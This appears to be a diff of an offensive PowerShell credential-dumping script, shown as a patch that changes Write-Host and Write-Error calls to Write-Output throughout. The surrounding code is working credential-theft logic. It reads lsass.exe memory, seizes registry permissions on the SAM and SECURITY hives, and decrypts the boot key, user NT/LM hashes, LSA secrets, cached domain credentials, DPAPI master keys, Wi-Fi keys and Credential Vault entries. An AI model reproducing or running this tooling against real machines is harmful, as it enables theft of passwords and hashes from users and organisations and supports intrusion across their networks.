@@ -391,7 +391,7 @@ function PBKDF2_HMAC_SHA256 ($Pwd, $Salt, $Length, $Iterations)
     If ($Res -ne 0)
     {
         $HexCode = ("{0:x8}" -f $Res).ToUpper()
-        Write-Error "Failed to open algorithm provider with ID 'SHA256' : $HexCode"
+        Write-Output "Failed to open algorithm provider with ID 'SHA256' : $HexCode"
         return $Null
     }
 
@@ -403,7 +403,7 @@ function PBKDF2_HMAC_SHA256 ($Pwd, $Salt, $Length, $Iterations)
     If ($Res -ne 0)
     {
         $HexCode = ("{0:x8}" -f $Res).ToUpper()
-        Write-Error "Failed to derive key : $HexCode"
+        Write-Output "Failed to derive key : $HexCode"
         return $Null
     }
 
@@ -411,7 +411,7 @@ function PBKDF2_HMAC_SHA256 ($Pwd, $Salt, $Length, $Iterations)
     If ($Res -ne 0)
     {
         $HexCode = ("{0:x8}" -f $Res).ToUpper()
-        Write-Error "Failed to close algorithm provider : $HexCode"
+        Write-Output "Failed to close algorithm provider : $HexCode"
         return $Null
     }
 
@@ -620,7 +620,7 @@ function Get-RegKeyClass($Key, $SubKey)
 		"HKU"  { $nKey = 0x80000003} # HK Users
 		"HKCC" { $nKey = 0x80000005} # HK Current Config
 		default {
-			Write-Error "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
+			Write-Output "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
 			return $Null
 		}
 	}
@@ -639,13 +639,13 @@ function Get-RegKeyClass($Key, $SubKey)
 		}
 		Else
 		{
-			Write-Error "RegQueryInfoKey() failed"
+			Write-Output "RegQueryInfoKey() failed"
 			return $Null
 		}
 	}
 	Else
 	{
-		Write-Error "RegOpenKeyEx() failed"
+		Write-Output "RegOpenKeyEx() failed"
 		return $Null
 	}
 }
@@ -684,19 +684,19 @@ function Get-RegKeyPropertyValue($Key, $SubKey, $Property)
 			}
 			Else
 			{
-				Write-Error "RegQueryValueEx() failed to retrieve value"
+				Write-Output "RegQueryValueEx() failed to retrieve value"
 				return $Null
 			}
 		}
 		Else
 		{
-			Write-Error "RegQueryValueEx() failed to compute value length"
+			Write-Output "RegQueryValueEx() failed to compute value length"
 			return $Null
 		}
 	}
 	Else
 	{
-		Write-Error "RegOpenKeyEx() failed"
+		Write-Output "RegOpenKeyEx() failed"
 		return $Null
 	}
 }
@@ -847,12 +847,12 @@ function SetupBeforeDumping()
 	# Win API will complain if different
 	If ([IntPtr]::Size -eq 4 -and ((Get-WmiObject Win32_OperatingSystem | select OSArchitecture).OSArchitecture -Like "64*"))
 	{
-		Write-Host ("[-] Running 32-bit Powershell to access 64-bit lsass.exe will fail")
+		Write-Output ("[-] Running 32-bit Powershell to access 64-bit lsass.exe will fail")
 		return $False
 	}
 	ElseIf ([IntPtr]::Size -eq 8 -and ((Get-WmiObject Win32_OperatingSystem | select OSArchitecture).OSArchitecture -Like "32*"))
 	{
-		Write-Host ("[-] Running 64-bit Powershell to access 32-bit lsass.exe will fail")
+		Write-Output ("[-] Running 64-bit Powershell to access 32-bit lsass.exe will fail")
 		return $False
 	}
 
@@ -1083,12 +1083,12 @@ function ReadMemory($Handle, $Pages, $Addr)
 				$Res = [WinProcAPI]::ReadProcessMemory($Handle, $Page["BaseAddress"], $Buff, $Page["RegionSize"], [ref] $BytesRead)
 				If (-not $Res)
 				{
-					Write-Host ("[-] Failed to read page. Try again")
+					Write-Output ("[-] Failed to read page. Try again")
 					return (ReadMemory $Handle $Pages $Addr)
 				}
 				ElseIf ($BytesRead -ne $Page["RegionSize"])
 				{
-					Write-Host ("[-] Failed to read entire page region size")
+					Write-Output ("[-] Failed to read entire page region size")
 					return $Null
 				}
 				Else
@@ -1104,7 +1104,7 @@ function ReadMemory($Handle, $Pages, $Addr)
 		}
 	}
 
-	Write-Host ("[-] Address 0x{0:X8} not found in process pages" -f ($Addr))
+	Write-Output ("[-] Address 0x{0:X8} not found in process pages" -f ($Addr))
 	return $Null
 }
 
@@ -1762,7 +1762,7 @@ function Get-BootKey
 			2- Apply permutations with the following table [ 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 ]
 	#>
 
-	Write-Host "`n[===] Retrieve Boot Key (or SysKey) [===]"
+	Write-Output "`n[===] Retrieve Boot Key (or SysKey) [===]"
 
 	# Set full control for registry "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" and subregistry/subkeys
 	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\CurrentControlSet\Control\Lsa', 'ReadWriteSubTree', 'ChangePermissions')
@@ -1782,7 +1782,7 @@ function Get-BootKey
 
 	# And we have the BootKey (or SysKey)
 	$HexBootKey = [System.BitConverter]::ToString($BootKey).Replace("-", "")
-	Write-Host ("[+] Boot Key = {0}" -f ($HexBootKey))
+	Write-Output ("[+] Boot Key = {0}" -f ($HexBootKey))
 
 	# Remove ACL
 	$Removed = $ACL.RemoveAccessRule($Rule)
@@ -1806,7 +1806,7 @@ function Get-HBootKey($BootKey)
 					- Hashed BootKey = AESDecrypt (BootKey, Data)
 	#>
 
-	Write-Host "`n[===] Compute Hashed Boot Key [===]"
+	Write-Output "`n[===] Compute Hashed Boot Key [===]"
 
 	$AQWERTY = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
 	$ANUM = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")
@@ -1823,7 +1823,7 @@ function Get-HBootKey($BootKey)
 
 	If (-not $K)
 	{
-		Write-Error "Unable to retrieve registry 'HKLM:\SAM\SAM\Domains\Account'"
+		Write-Output "Unable to retrieve registry 'HKLM:\SAM\SAM\Domains\Account'"
 		return $Null
 	}
 
@@ -1831,7 +1831,7 @@ function Get-HBootKey($BootKey)
 	$DOMAIN_ACCOUNT_F = $K.GetValue("F")
 	If (-not $DOMAIN_ACCOUNT_F)
 	{
-		Write-Error "Unable to retrieve key 'F' into registry 'HKLM:\SAM\SAM\Domains\Account'"
+		Write-Output "Unable to retrieve key 'F' into registry 'HKLM:\SAM\SAM\Domains\Account'"
 		return $Null
 	}
 
@@ -1887,11 +1887,11 @@ function Get-HBootKey($BootKey)
 
 		If (@(Compare-Object $NewCheckSum $HBootKey[16..$($HBootKey.Length-1)] -SyncWindow 0).Length -ne 0)
 		{
-			Write-Error "Hashed BootKey checksum failed, Syskey startup password probably in use"
+			Write-Output "Hashed BootKey checksum failed, Syskey startup password probably in use"
 			return $Null
 		}
 
-		Write-Host ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
+		Write-Output ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
 		return $HBootKey
 	}
 	# Else : This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also), according to "secretsdump.py"
@@ -1909,12 +1909,12 @@ function Get-HBootKey($BootKey)
 		# Hashed BootKey = AESDecrypt (BootKey, Data, Salt)
 		$HBootKey = AESTransform $BootKey $Data[0..$([BitConverter]::ToUInt32($DataLen, 0) - 1)] $Salt ([Security.Cryptography.CipherMode]::CBC) $False
 
-		Write-Host ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
+		Write-Output ("[+] Hashed Boot Key = {0}" -f ([System.BitConverter]::ToString($HBootKey).Replace("-", "")))
 		return $HBootKey
 	}
 	Else
 	{
-		Write-Error '"F" key from "HKLM\SAM\SAM\Domains\Account" registry parsing error'
+		Write-Output '"F" key from "HKLM\SAM\SAM\Domains\Account" registry parsing error'
 		return $Null
 	}
 }
@@ -2142,7 +2142,7 @@ function Get-SAM($BootKey)
 	# Compute Hashed BootKey
 	$HBootKey = Get-HBootkey $BootKey
 
-	Write-Host "`n[===] Retrieve user's LM/NT Hashes and decrypt them with Boot Key [===]"
+	Write-Output "`n[===] Retrieve user's LM/NT Hashes and decrypt them with Boot Key [===]"
 
 	# Get users keys
 	$UsersKeys = Get-UsersKeys
@@ -2162,7 +2162,7 @@ function Get-SAM($BootKey)
 		{
 			$HexLMHash = [System.BitConverter]::ToString($LMHash).Replace("-", "")
 			$HexNTHash = [System.BitConverter]::ToString($NTHash).Replace("-", "")
-			Write-Host ("[+] {0}:{1}:{2}:{3}" -f ($UserName, $RID, $HexLMHash, $HexNTHash))
+			Write-Output ("[+] {0}:{1}:{2}:{3}" -f ($UserName, $RID, $HexLMHash, $HexNTHash))
 
 			$UserInfo["RID"] = $RID
 			$UserInfo["NT"] = $NTHash
@@ -2220,7 +2220,7 @@ function Get-LSASecretKey($BootKey)
 
 	#>
 
-	Write-Host "`n[===] Retrieve LSA Secret Key with Boot Key [===]"
+	Write-Output "`n[===] Retrieve LSA Secret Key with Boot Key [===]"
 
 	# Set full control for registry "HKLM\SECURITY\Policy" and subregistry/subkeys
 	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Policy', 'ReadWriteSubTree', 'ChangePermissions')
@@ -2243,7 +2243,7 @@ function Get-LSASecretKey($BootKey)
 			$SubKey.SetAccessControl($ACL)
 			$SubKey.Close()
 
-			Write-Error "Unable to retrieve encrypted LSA Secret Key"
+			Write-Output "Unable to retrieve encrypted LSA Secret Key"
 			return $Null
 		}
 		Else
@@ -2309,7 +2309,7 @@ function Get-LSASecretKey($BootKey)
 	}
 
 	$HexLSASecretKey = [System.BitConverter]::ToString($LSASecretKey).Replace("-", "")
-	Write-Host ("[+] LSA Secret Key = {0}" -f ($HexLSASecretKey))
+	Write-Output ("[+] LSA Secret Key = {0}" -f ($HexLSASecretKey))
 
 	return $LSASecretKey
 }
@@ -2448,7 +2448,7 @@ function Get-LSASecrets($LSASecretKey)
 		All stuff is in Decrypt-LSASecret
 	#>
 
-	Write-Host "`n[===] Enumerate LSA Secrets and decrypt them with LSA Secret Key [===]"
+	Write-Output "`n[===] Enumerate LSA Secrets and decrypt them with LSA Secret Key [===]"
 
 	# Set full control for registry "HKLM\SECURITY\Policy\Secrets" and subregistry/subkeys
 	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Policy\Secrets', 'ReadWriteSubTree', 'ChangePermissions')
@@ -2489,7 +2489,7 @@ function Get-LSASecrets($LSASecretKey)
 			$NLKMKey = $LSA_SECRET_BLOB[16..$(16+($Length-1))]
 			$Remaining = $LSA_SECRET_BLOB[$(16+($Length))..$($LSA_SECRET_BLOB.Length-1)]
 			$HexNLKM = [System.BitConverter]::ToString($NLKMKey).Replace("-", "")
-			Write-Host ('[+] Cached Domain Credentials NL$KM Key = ' + $HexNLKM)
+			Write-Output ('[+] Cached Domain Credentials NL$KM Key = ' + $HexNLKM)
 		}
 		ElseIf ($Child.PSChildName -eq "DPAPI_SYSTEM")
 		{
@@ -2501,7 +2501,7 @@ function Get-LSASecrets($LSASecretKey)
 
 			$HexMachinekey = [System.BitConverter]::ToString($MachineKey).Replace("-", "")
 			$HexUserkey = [System.BitConverter]::ToString($UserKey).Replace("-", "")
-			Write-Host ("[+] DPAPI System Machine PreKey = {0}`n[+] DPAPI System User PreKey = {1}" -f ($HexMachinekey, $HexUserkey))
+			Write-Output ("[+] DPAPI System Machine PreKey = {0}`n[+] DPAPI System User PreKey = {1}" -f ($HexMachinekey, $HexUserkey))
 		}
 		ElseIf ($Child.PSChildName -eq '$MACHINE.ACC')
 		{
@@ -2513,8 +2513,8 @@ function Get-LSASecrets($LSASecretKey)
 			$HexMACHINEACC_Plain = [System.BitConverter]::ToString($MACHINEACC_Plain).Replace("-", "")
 			$ComputerName = (Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name).Name
 			$DomainName = (Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain).Domain
-			Write-Host ('[+] Machine account LM/NT Hashes = {0}\{1}$:{2}:{3}' -f ($DomainName, $ComputerName, $HexEmptyLM, $HexMACHINEACC_NT))
-			Write-Host ('[+] Machine account Cleartext Pwd Hex = {0}' -f ($HexMACHINEACC_Plain))
+			Write-Output ('[+] Machine account LM/NT Hashes = {0}\{1}$:{2}:{3}' -f ($DomainName, $ComputerName, $HexEmptyLM, $HexMACHINEACC_NT))
+			Write-Output ('[+] Machine account Cleartext Pwd Hex = {0}' -f ($HexMACHINEACC_Plain))
 		}
 		ElseIf ($Child.PSChildName -eq "DefaultPassword")
 		{
@@ -2523,7 +2523,7 @@ function Get-LSASecrets($LSASecretKey)
 			$DefaultDomain = (Get-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").GetValue("DefaultDomainName")
 			If (-not $DefaultLogin) { $DefaultLogin = "<UnknownUser>" }
 			If (-not $DefaultDomain) { $DefaultDomain = "." }
-			Write-Host ("[+] Default login account credentials = {0}\{1}:{2}" -f ($DefaultDomain, $DefaultLogin, $DefaultPWD))
+			Write-Output ("[+] Default login account credentials = {0}\{1}:{2}" -f ($DefaultDomain, $DefaultLogin, $DefaultPWD))
 		}
 		ElseIf ($Child.PSChildName[0..3] -eq "_SC_")
 		{
@@ -2539,13 +2539,13 @@ function Get-LSASecrets($LSASecretKey)
 				}
 			}
 			If (-not $Account) { $Account = "<UnknownUser>" }
-			Write-Host ("[+] Service account secret = {0}:{1}:{2}" -f ($Account, $ServiceName, $Secret))
+			Write-Output ("[+] Service account secret = {0}:{1}:{2}" -f ($Account, $ServiceName, $Secret))
 		}
 		ElseIf ($Child.PSChildName -eq "ASPNET_WP_PASSWORD")
 		{
 			# Not tested
 			$ASPNET_WP_PASSWORD = [Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])
-			Write-Host ("[+] ASPNET Password = {0}" -f ($ASPNET_WP_PASSWORD))
+			Write-Output ("[+] ASPNET Password = {0}" -f ($ASPNET_WP_PASSWORD))
 		}
 		ElseIf ($Child.PSChildName[0..8] -eq 'L$_SQSA_S')
 		{
@@ -2558,17 +2558,17 @@ function Get-LSASecrets($LSASecretKey)
 				{
 				   $Question = $Item.question
 				   $Answer = $Item.answer
-				   Write-Host ("[+] Security Question/Answer = {0}:{1}" -f ($Question, $Answer))
+				   Write-Output ("[+] Security Question/Answer = {0}:{1}" -f ($Question, $Answer))
 				}
 			}
 			Else
 			{
-				Write-Host ("[-] Unknown Security Questions LSA Secret version")
+				Write-Output ("[-] Unknown Security Questions LSA Secret version")
 			}
 		}
 		Else
 		{
-			Write-Host ("[-] Unknown LSA Secret : {0}" -f ($Child.PSChildName))
+			Write-Output ("[-] Unknown LSA Secret : {0}" -f ($Child.PSChildName))
 		}
 	}
 
@@ -2607,7 +2607,7 @@ function Get-CachedDomainCreds($NLKM)
 				- DomainName = Plaintext[:pad(NL_RECORD[DnsDomainNameLength])].decode ("UTF-16LE")
 	#>
 
-	Write-Host ("`n[===] Enumerate Cached Domain Credentials and decrypt them with {0} Key from LSA Secrets [===]" -f ('NL$KM'))
+	Write-Output ("`n[===] Enumerate Cached Domain Credentials and decrypt them with {0} Key from LSA Secrets [===]" -f ('NL$KM'))
 
 	# Set full control for registry "HKLM\SECURITY\Cache" and subregistry/subkeys
 	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Cache', 'ReadWriteSubTree', 'ChangePermissions')
@@ -2691,7 +2691,7 @@ function Get-CachedDomainCreds($NLKM)
 						$Plaintext = $PlainText[$((Pad $UserLength) + (Pad $DomainNameLength))..$($PlainText.Length-1)]
 						$DomainName = ([Text.Encoding]::Unicode.GetString($PlainText[0..$((Pad $DnsDomainNameLength)-1)])) -Replace "`0", ""
 
-						Write-Host ("[+] {0}\{1}:{2}" -f ($DomainName, $UserName, $HexMSCashHash))
+						Write-Output ("[+] {0}\{1}:{2}" -f ($DomainName, $UserName, $HexMSCashHash))
 
 						$CachedDomainCred["DomainName"] = $DomainName
 						$CachedDomainCred["MSCashHash"] = $MSCashHash
@@ -2699,7 +2699,7 @@ function Get-CachedDomainCreds($NLKM)
 					}
 					Else
 					{
-						Write-Error ("Unknown NL_RECORD[Flags] for entry {0}" -f ($_.Name))
+						Write-Output ("Unknown NL_RECORD[Flags] for entry {0}" -f ($_.Name))
 					}
 				}
 			}
@@ -2711,7 +2711,7 @@ function Get-CachedDomainCreds($NLKM)
 	$SubKey.SetAccessControl($ACL)
 	$SubKey.Close()
 
-	If ($CachedDomainCreds.Count -eq 0) { Write-Host "[-] No cached domain credentials saved" }
+	If ($CachedDomainCreds.Count -eq 0) { Write-Output "[-] No cached domain credentials saved" }
 
 	return $CachedDomainCreds
 }
@@ -3006,12 +3006,12 @@ function Decrypt-MasterKey($MKType, $PreKeys, $Enc_Key, $HashAlgo, $CipherAlgo, 
 		$HMAC_Calc = $Hasher.ComputeHash($Decrypted_MasterKey)
 		If (@(Compare-Object $HMAC_Calc[0..$($Global:ALGORITHMS_DATA[$HashAlgo][0]-1)] $HMAC_Res -SyncWindow 0).Length -eq 0)
 		{
-			Write-Host ("[...] Decrypted {0} with PreKey {1} = {2}" -f ($MKType, ([System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")), ([System.BitConverter]::ToString($Decrypted_MasterKey).Replace("-", ""))))
+			Write-Output ("[...] Decrypted {0} with PreKey {1} = {2}" -f ($MKType, ([System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")), ([System.BitConverter]::ToString($Decrypted_MasterKey).Replace("-", ""))))
 			return $Decrypted_MasterKey
 		}
 	}
 
-	Write-Host ("[...] None PreKeys allowed to decrypt {0}" -f ($MKType))
+	Write-Output ("[...] None PreKeys allowed to decrypt {0}" -f ($MKType))
 	return $Null
 }
 
@@ -3121,14 +3121,14 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 				- C:\Windows\System32\Microsoft\Protect\<MKGUID> (System Machine Master Key File)
 	#>
 
-	Write-Host ("`n[===] Try to decrypt all Master Keys Files with LSA DPAPI System Machine/User Keys and user's passwords/NT Hashes [===]")
+	Write-Output ("`n[===] Try to decrypt all Master Keys Files with LSA DPAPI System Machine/User Keys and user's passwords/NT Hashes [===]")
 
 	# Retrieve all Pre Keys
-	Write-Host ("[+] Compute PreKeys")
+	Write-Output ("[+] Compute PreKeys")
 	$PreKeys = Get-PreKeys $LSA_DPAPI_SYSTEM $SAM $Pwds $NTHashes
 	ForEach ($PreKey in $PreKeys)
 	{
-		Write-Host ("[...] {0} = {1}" -f ($PreKey["Type"], [System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")))
+		Write-Output ("[...] {0} = {1}" -f ($PreKey["Type"], [System.BitConverter]::ToString($PreKey["Value"]).Replace("-", "")))
 	}
 
 	$MasterKeys = @{}
@@ -3144,7 +3144,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 			{
 				If ($UserMasterKeyFileName -Match "([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)")
 				{
-					Write-Host ("[+] Found User MasterKey File {0}" -f ("C:\Users\$User\AppData\Roaming\Microsoft\Protect\$SID\$UserMasterKeyFileName"))
+					Write-Output ("[+] Found User MasterKey File {0}" -f ("C:\Users\$User\AppData\Roaming\Microsoft\Protect\$SID\$UserMasterKeyFileName"))
 
 					# Find if the MasterKey is already dumped from LSASS
 					$Found = $False
@@ -3154,7 +3154,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 						If ($MKGUID -eq $LSASS_MasterKey["Key_GUID"])
 						{
 							$Found = $True
-							Write-Host ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
+							Write-Output ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
 							$Keys = @{}
 							$Keys["MasterKey"] =  $LSASS_MasterKey["MasterKey"]
 							$UserMasterKeys[$MKGUID] = $Keys
@@ -3189,7 +3189,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 						If ($ItemUser -Match "([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)")
 						{
 							$SystemUserMasterKeyFileName = $ItemUser
-							Write-Host ("[+] Found System User MasterKey File {0}" -f ("C:\Windows\System32\Microsoft\Protect\$SID\User\$SystemUserMasterKeyFileName"))
+							Write-Output ("[+] Found System User MasterKey File {0}" -f ("C:\Windows\System32\Microsoft\Protect\$SID\User\$SystemUserMasterKeyFileName"))
 
 							# Find if the MasterKey is already dumped from LSASS
 							$Found = $False
@@ -3199,7 +3199,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 								If ($MKGUID -eq $LSASS_MasterKey["Key_GUID"])
 								{
 									$Found = $True
-									Write-Host ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
+									Write-Output ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
 									$Keys = @{}
 									$Keys["MasterKey"] =  $LSASS_MasterKey["MasterKey"]
 									$SystemMasterKeys[$MKGUID] = $Keys
@@ -3218,7 +3218,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 				ElseIf ($Item -Match "([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)")
 				{
 					$SystemMachineMasterKeyFileName = $Item
-					Write-Host ("[+] Found System Machine MasterKey File {0}" -f ("C:\Windows\System32\Microsoft\Protect\$SID\$SystemMachineMasterKeyFileName"))
+					Write-Output ("[+] Found System Machine MasterKey File {0}" -f ("C:\Windows\System32\Microsoft\Protect\$SID\$SystemMachineMasterKeyFileName"))
 
 					# Find if the MasterKey is already dumped from LSASS
 					$Found = $False
@@ -3228,7 +3228,7 @@ function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes, $LSA
 						If ($MKGUID -eq $LSASS_MasterKey["Key_GUID"])
 						{
 							$Found = $True
-							Write-Host ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
+							Write-Output ("[...] Decrypted MasterKey found from LSASS = {0}" -f ([System.BitConverter]::ToString($LSASS_MasterKey["MasterKey"]).Replace("-", "")))
 							$Keys = @{}
 							$Keys["MasterKey"] =  $LSASS_MasterKey["MasterKey"]
 							$SystemMasterKeys[$MKGUID] = $Keys
@@ -3400,7 +3400,7 @@ function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy)
 
 	If (-not $MasterKeyFound)
 	{
-		Write-Host ("[...] MasterKey with GUID {0} not found for decryption" -f ($MasterKey_GUID))
+		Write-Output ("[...] MasterKey with GUID {0} not found for decryption" -f ($MasterKey_GUID))
 		return $Null
 	}
 
@@ -3616,7 +3616,7 @@ function Decrypt-CredentialFile($FilePath, $MasterKeys)
 	}
 	Else
 	{
-		Write-Host ("[...] None MasterKeys allowed to decrypt CredentialFile")
+		Write-Output ("[...] None MasterKeys allowed to decrypt CredentialFile")
 		return $Null
 	}
 }
@@ -3629,7 +3629,7 @@ function Get-WiFiPwds($MasterKeys)
 		Get-WiFiPwds: With System MasterKeys we can always decrypt Wi-Fi pwds
 			- Encrypted password for each Wireless interface and each SSID is located at C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<IDForWirelessInterface>\<IDForSSID>.xml
 	#>
-	Write-Host ("`n[===] Searching Wi-Fi pwds and decrypt them with System's Master Keys [===]")
+	Write-Output ("`n[===] Searching Wi-Fi pwds and decrypt them with System's Master Keys [===]")
 
 	If (Test-Path "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\*\*")
 	{
@@ -3655,22 +3655,22 @@ function Get-WiFiPwds($MasterKeys)
 						If ($BytesKey)
 						{
 							$StringKey = [System.Text.Encoding]::ASCII.GetString($BytesKey)
-							Write-Host ("[+] Key for SSID {0} = {1}" -f ($SSID, $StringKey))
+							Write-Output ("[+] Key for SSID {0} = {1}" -f ($SSID, $StringKey))
 						}
 						Else
 						{
-							Write-Host ("[-] No MasterKey found for decrypting key for SSID {0}" -f ($SSID))
+							Write-Output ("[-] No MasterKey found for decrypting key for SSID {0}" -f ($SSID))
 						}
 					}
 					Else
 					{
-						Write-Host ("[-] No key found for SSID {0}" -f ($SSID))
+						Write-Output ("[-] No key found for SSID {0}" -f ($SSID))
 					}
 				}
 			}
 		}
 	}
-	Else { Write-Host "[-] No Wi-Fi pwds configured" }
+	Else { Write-Output "[-] No Wi-Fi pwds configured" }
 }
 
 function Get-CredentialVaultManager($MasterKeys)
@@ -3682,7 +3682,7 @@ function Get-CredentialVaultManager($MasterKeys)
 			3- Find all VCRD files and try to decrypt them with each keys gained from VPOL files
 	#>
 
-	Write-Host ("`n[===] Search VPOL and VCRD Files and decrypt them [===]")
+	Write-Output ("`n[===] Search VPOL and VCRD Files and decrypt them [===]")
 
 	$VPOLPaths = @()
 	ForEach ($User in (Get-ChildItem "C:\Users" -Force))
@@ -3735,7 +3735,7 @@ function Get-CredentialVaultManager($MasterKeys)
 	$VPOLKeys = @()
 	ForEach ($VPOLPath in $VPOLPaths)
 	{
-		Write-Host ("[+] Found VPOL File {0}" -f ($VPOLPath))
+		Write-Output ("[+] Found VPOL File {0}" -f ($VPOLPath))
 		$VPOLBytes = [System.IO.File]::ReadAllBytes($VPOLPath)
 
 		# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_VPOL
@@ -3784,7 +3784,7 @@ function Get-CredentialVaultManager($MasterKeys)
 					$Key = $BCRYPT_KEY_DATA_BLOB_HEADER[12..(12+$KeyData-1)]
 					$HexKey = [System.BitConverter]::ToString($Key).Replace("-", "")
 					$VPOLKeys += ,($Key)
-					Write-Host ("[...] Found VPOL Key = {0}" -f ($HexKey))
+					Write-Output ("[...] Found VPOL Key = {0}" -f ($HexKey))
 
 					$VPOLDecrypted = $VPOLDecrypted[(12+$Size-8)..($VPOLDecrypted.Length-1)]
 				}
@@ -3797,7 +3797,7 @@ function Get-CredentialVaultManager($MasterKeys)
 					$Key = $VPOLDecrypted[12..(12+$Size-8)]
 					$HexKey = [System.BitConverter]::ToString($Key).Replace("-", "")
 					$VPOLKeys += ,($Key)
-					Write-Host ("[...] Found VPOL Key = {0}" -f ($HexKey))
+					Write-Output ("[...] Found VPOL Key = {0}" -f ($HexKey))
 
 					$VPOLDecrypted = $VPOLDecrypted[(12+$Size-8)..($VPOLDecrypted.Length-1)]
 				}
@@ -3805,7 +3805,7 @@ function Get-CredentialVaultManager($MasterKeys)
 		}
 		Else
 		{
-			Write-Host "[...] None MasterKeys allowed to decrypt VPOL File"
+			Write-Output "[...] None MasterKeys allowed to decrypt VPOL File"
 		}
 	}
 
@@ -3857,7 +3857,7 @@ function Get-CredentialVaultManager($MasterKeys)
 
 	ForEach ($VCRDPath in $VCRDPaths)
 	{
-		Write-Host ("[+] Decrypt VCRD File {0} with VPOL Keys" -f ($VCRDPath))
+		Write-Output ("[+] Decrypt VCRD File {0} with VPOL Keys" -f ($VCRDPath))
 		$VCRDBytes = [System.IO.File]::ReadAllBytes($VCRDPath)
 
 		# Structure from Pypykatz DPAPI/Structures/Vault : VAULT_VCRD
@@ -3873,9 +3873,9 @@ function Get-CredentialVaultManager($MasterKeys)
 		If ($FriendlyName_Length -gt 0)
 		{
 			$FriendlyName = [System.Text.Encoding]::Unicode.GetString($FriendlyName)
-			Write-Host ("[...] Friendly name = {0}" -f ($FriendlyName))
+			Write-Output ("[...] Friendly name = {0}" -f ($FriendlyName))
 		}
-		Else { Write-Host "[...] Friendly name = <Empty>" }
+		Else { Write-Output "[...] Friendly name = <Empty>" }
 		$X = $Y
 		$Y = $X + 4
 		$AttributeMaps_Length = [BitConverter]::ToUInt32($VCRDBytes[$X..($Y-1)], 0)
@@ -3994,7 +3994,7 @@ function Get-CredentialVaultManager($MasterKeys)
 
 		ForEach ($VPOLKey in $VPOLKeys)
 		{
-			Write-Host ("[...] Decrypt VCRD File Attributes with VPOL Key {0}" -f ([System.BitConverter]::ToString($VPOLKey).Replace("-", "")))
+			Write-Output ("[...] Decrypt VCRD File Attributes with VPOL Key {0}" -f ([System.BitConverter]::ToString($VPOLKey).Replace("-", "")))
 			ForEach ($Attribute in $Attributes)
 			{
 				If ($Attribute["Data"])
@@ -4002,12 +4002,12 @@ function Get-CredentialVaultManager($MasterKeys)
 					If ($Attribute["IV"])
 					{
 						$ClearTextBytes = AESTransform $VPOLKey $Attribute["Data"] $Attribute["IV"] ([Security.Cryptography.CipherMode]::CBC) $False
-						Write-Host ("[......] Attribute may be = {0}" -f ([Text.Encoding]::Unicode.GetString($ClearTextBytes)))
+						Write-Output ("[......] Attribute may be = {0}" -f ([Text.Encoding]::Unicode.GetString($ClearTextBytes)))
 					}
 					Else
 					{
 						$ClearTextBytes = AESTransform $VPOLKey $Attribute["Data"] ((,[byte]0) * 16) ([Security.Cryptography.CipherMode]::CBC) $False
-						Write-Host ("[......] Attribute may be = {0}" -f ([Text.Encoding]::Unicode.GetString($ClearTextBytes)))
+						Write-Output ("[......] Attribute may be = {0}" -f ([Text.Encoding]::Unicode.GetString($ClearTextBytes)))
 					}
